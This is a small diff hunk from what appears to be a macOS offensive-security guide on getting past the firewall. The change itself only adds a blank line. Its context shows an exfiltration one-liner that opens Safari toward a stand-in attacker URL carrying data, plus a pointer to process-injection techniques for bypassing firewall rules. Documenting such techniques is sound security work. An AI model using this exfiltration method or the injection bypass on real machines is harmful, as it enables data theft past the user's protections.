@@ -76,6 +76,7 @@ open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
 If you can **inject code into a process** that is allowed to connect to any server you could bypass the firewall protections:
 
 
+
 {{#ref}}
 macos-proces-abuse/
 {{#endref}}
